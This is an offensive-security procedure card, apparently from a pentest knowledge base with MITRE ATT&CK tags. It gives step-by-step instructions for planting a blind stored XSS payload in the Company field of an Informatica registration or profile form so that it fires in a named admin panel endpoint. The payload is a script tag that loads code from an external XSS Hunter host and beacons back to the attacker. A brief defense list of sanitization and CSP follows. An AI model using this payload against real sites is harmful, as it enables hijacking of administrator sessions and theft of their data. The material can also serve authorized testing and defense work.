---
tags:
  - xss-injection
  - payload
  - execution
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.175Z'
sub_techniques: []
id: 113aea4e-7e1d-43e0-9506-d4ee0daf9d61
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Blind-XSS-Payload-in-Company-Field

## Summary

This procedure injects a blind XSS payload into the Company field during Informatica account registration or profile update, exploiting lack of HTML sanitization to store executable JavaScript that activates upon admin review.

## Description

The Company field accepts user input without proper escaping, allowing closure of HTML tags and script insertion. The payload `<script src=https://monty.xss.ht></script>` is blind, meaning it doesn't execute immediately but persists in the database and fires when rendered in the admin panel at endpoints like /phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit. This leads to JavaScript execution in the admin's session, enabling data theft. Prerequisites include an active registration session.

## Requirements

1. Access to the registration or profile edit form
2. Generated XSS Hunter payload URL
3. Basic knowledge of XSS payloads

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding
- Use Content Security Policy (CSP) to block external scripts
- Audit admin panel rendering for unsanitized data

## Objectives

1. Store malicious script without detection
2. Ensure payload targets admin context
3. Prepare for exfiltration upon trigger

## Instructions

### Step 1: Prepare Payload

**Context**: Generate or use a pre-built blind XSS payload from a monitoring service.

No command required; copy `<script src=https://monty.xss.ht></script>` (replace with your XSS Hunter URL).

> This payload loads an external script that beacons back to the attacker.

### Step 2: Enter Payload in Form

**Context**: Insert the payload into the vulnerable field during submission.

No command required; paste into Company field and submit the form.

> Expected output: Form acceptance without errors; payload stored in user record.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss-injection]]
- [[payload]]
